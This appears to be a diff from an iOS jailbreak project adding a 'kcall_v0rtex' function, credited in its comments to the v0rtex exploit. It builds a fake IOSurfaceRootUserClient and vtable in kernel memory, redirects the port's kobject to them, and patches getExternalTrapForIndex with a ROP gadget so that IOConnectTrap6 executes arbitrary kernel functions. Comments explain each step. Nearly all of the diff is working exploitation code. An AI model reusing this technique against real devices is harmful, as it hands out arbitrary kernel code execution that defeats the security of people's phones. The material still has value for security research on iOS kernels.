@@ -252,14 +252,114 @@ uint64_t kcall(uint64_t fptr, uint32_t argc, ...) {
 }
 
 
+typedef mach_port_t io_connect_t;
+kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
+extern mach_port_t user_client;
+
+kern_return_t kcall_v0rtex(uint64_t fptr, uint32_t argc, ...) {
+    uint64_t args[7] = {0};
+    va_list ap;
+    va_start(ap, argc);
+
+    if (argc > 7) {
+        printf("too many arguments to kcall\n");
+        return 0;
+    }
+
+    for (int i = 0; i < argc; i++){
+        args[i] = va_arg(ap, uint64_t);
+    }
+
+    va_end(ap);
+
+    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
+    static uint64_t IOSurfaceRootUserClient_port = 0;
+    static uint64_t IOSurfaceRootUserClient_addr = 0;
+    static uint64_t IOSurfaceRootUserClient_vtab = 0;
+
+    if (IOSurfaceRootUserClient_vtab == 0) {
+        IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
+        IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
+        IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
+    }
 
 
+    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
+    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
 
 
+    // Create the vtable in the kernel memory, then copy the existing vtable into there
+    static uint64_t fake_vtable = 0;
+    static uint64_t fake_client = 0;
+
+    if (!(fake_vtable && fake_client)) {
+        fake_vtable = kmem_alloc(0x1000);
+        printf("Created fake_vtable at %016llx\n", fake_vtable);
+
+        for (int i = 0; i < 0x200; i++) {
+            wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
+        }
+
+        printf("Copied some of the vtable over\n");
 
 
+        // Create the fake user client
+        fake_client = kmem_alloc(0x1000);
+        printf("Created fake_client at %016llx\n", fake_client);
 
+        for (int i = 0; i < 0x200; i++) {
+            wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
+        }
 
+        printf("Copied the user client over\n");
 
+        // Write our fake vtable into the fake user client
+        wk64(fake_client, fake_vtable);
 
+        // Replace the user client with ours
+        wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
+
+        // Now the userclient port we have will look into our fake user client rather than the old one
+
+        uint64_t find_add_x0_x0_0x40_ret(void);
+        // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
+        wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
+
+        printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
+    }
+
+    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
+    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
+    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
+    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
+    // through like normal.
+
+    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
+    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
+    // (i'm not actually sure if the switch back is necessary but meh
+    #define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
+    do { \
+    uint64_t offx20 = rk64(fake_client+0x40); \
+    uint64_t offx28 = rk64(fake_client+0x48); \
+    wk64(fake_client+0x40, x0); \
+    wk64(fake_client+0x48, addr); \
+    err = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6)); \
+    wk64(fake_client+0x40, offx20); \
+    wk64(fake_client+0x48, offx28); \
+    } while (0);
+
+    kern_return_t err;
+
+    KCALL(fptr, args[0],
+          args[1],
+          args[2],
+          args[3],
+          args[4],
+          args[5],
+          args[6]);
+
+    return err;
+
+//    wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
+}
 
